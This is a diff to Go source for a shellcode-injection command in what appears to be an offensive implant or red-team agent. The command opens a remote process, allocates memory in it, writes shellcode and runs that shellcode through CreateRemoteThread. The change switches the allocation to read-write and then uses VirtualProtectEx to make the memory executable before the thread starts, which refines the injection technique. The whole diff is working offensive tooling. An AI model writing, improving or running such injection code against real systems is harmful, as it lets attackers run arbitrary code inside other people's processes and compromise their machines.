@@ -172,15 +172,15 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 
 	output += "[+] Successfully opened process handle\n"
 
-	// Step 2: Allocate memory in remote process with RX permissions
-	output += fmt.Sprintf("[*] Allocating %d bytes of RX memory in remote process...\n", len(shellcode))
+	// Step 2: Allocate RW memory in remote process (W^X: write first, protect later)
+	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory in remote process...\n", len(shellcode))
 
 	remoteAddr, _, err := procVirtualAllocEx.Call(
 		hProcess,
 		uintptr(0),
 		uintptr(len(shellcode)),
 		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_EXECUTE_READ),
+		uintptr(PAGE_READWRITE),
 	)
 
 	if remoteAddr == 0 {
@@ -215,7 +215,21 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 
 	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
 
-	// Step 4: Create remote thread to execute shellcode
+	// Step 4: Change to RX (W^X enforcement — never allocate RWX)
+	var oldProtect uint32
+	ret, _, err = procVirtualProtectX.Call(
+		hProcess, remoteAddr, uintptr(len(shellcode)),
+		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
+	if ret == 0 {
+		return structs.CommandResult{
+			Output:    output + fmt.Sprintf("[!] VirtualProtectEx failed: %v\n", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	output += "[+] Changed memory protection to RX\n"
+
+	// Step 5: Create remote thread to execute shellcode
 	output += "[*] Creating remote thread...\n"
 
 	hThread, _, err := procCreateRemoteThread.Call(
